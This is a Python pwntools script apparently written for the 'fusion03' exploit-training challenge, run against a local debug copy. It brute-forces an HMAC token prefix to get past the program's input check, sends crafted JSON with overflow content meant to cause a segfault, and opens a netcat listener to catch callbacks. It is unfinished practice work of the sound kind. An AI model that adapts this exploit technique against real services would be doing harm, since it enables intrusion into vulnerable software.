from pwn import *
import json
import hmac
from hashlib import sha1

############################################################################################################################################################
# INTERACT WITH LOCAL PROGRAM CLONE FOR DEBUGGING
############################################################################################################################################################



level = "fusion03"

err_log_file = open("/home/kali/CLionPrjects/"+level+"/err.log", 'w')
p = process(["/home/kali/CLionPrjects/"+level+"/cmake-build-debug/"+level], stderr=err_log_file.fileno())

def random_string(size=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))


def to_clipboard(data):
    from subprocess import Popen, PIPE
    xsel = Popen(['xsel', '-bi'], stdin=PIPE)
    xsel.communicate(input=data)
    log.info(f"put to clipboard: {data}")


pid = process(["pgrep", level]).recvall()
to_clipboard(pid)



def gen_payload(token, content, serverip):
    while (True):
        title = random_string(20)

        # msg = json.dumps({
        #     "tags": tags,
        #     "title": title,
        #     "contents": content,
        #     "serverip": serverip
        # })

        # need to do this manually bc json.dumps refuses to accept bytes
        # but target json-c lib does not ;)
        msg = b"{\"tags\": [\"tag1\", \"tag2\", \"tag3\"], \"title\": \"" \
              + bytes(title, "utf-8") \
              + b"\", \"contents\": \"" + content \
              + b"\", \"serverip\": \"" + serverip + b"\"}"

        payload = b""
        payload += token
        payload += b"\n"
        payload += msg

        hashed = hmac.new(token, payload, sha1)
        first_bytes = hashed.hexdigest()[:4]

        log.debug(f"first_bytes: {first_bytes}")

        if first_bytes == "0000":
            # found hash collision -> valid check passes
            log.info(f"msg: {msg}")
            log.info(f"Hash: {hashed.hexdigest()}")
            return payload


listener_port = "4000"

# s = connect("03")
# dmesg = Dmesg(s)


def start_receiving_nc():
    listener_nc = process(["nc", "-l", "-p", listener_port])
    try:
        while True:
            print("waiting for data")
            print(listener_nc.recv())
    except Exception:
        log.warn("listening nc died")

# def start_receiving_nc():
#     listener_nc = process(["nc", "-l", "-p", listener_port, guest_ip])
#     while True:
#         print("waiting for data")
#         print(listener_nc.recvline())


thread = threading.Thread(target=start_receiving_nc)
thread.start()
sleep(1)

# nc = s.process(["nc", "localhost", port])

token = p.recv().rstrip().replace(b"\"", b"")
# token = b"// 127.0.0.1:59633-1615872148-93892559-1767467136-447270649"


log.info(f"token: {token}")


content = b""

# switch comments for segfault
content += b"A"*10
# content += b"A"*1023
# content += b"\\\\u"
# content += b"B"*1000

log.debug(f"content: {content}")
write("/tmp/docgil", content)
# serverip = "127.0.0.1:"+listener_port
serverip = b"127.0.0.1:"+bytes(listener_port, "utf-8")

payload = gen_payload(token, content, serverip)

log.info(f"payload: {payload}")

p.interactive()
p.send(payload)
# send EOF
p.close()
log.info("payload sent")

log.info("debug msges from local process:")
try:
    while True:
        log.info(p.recvline().replace(b"\n", b""))
except EOFError:
    print("done")






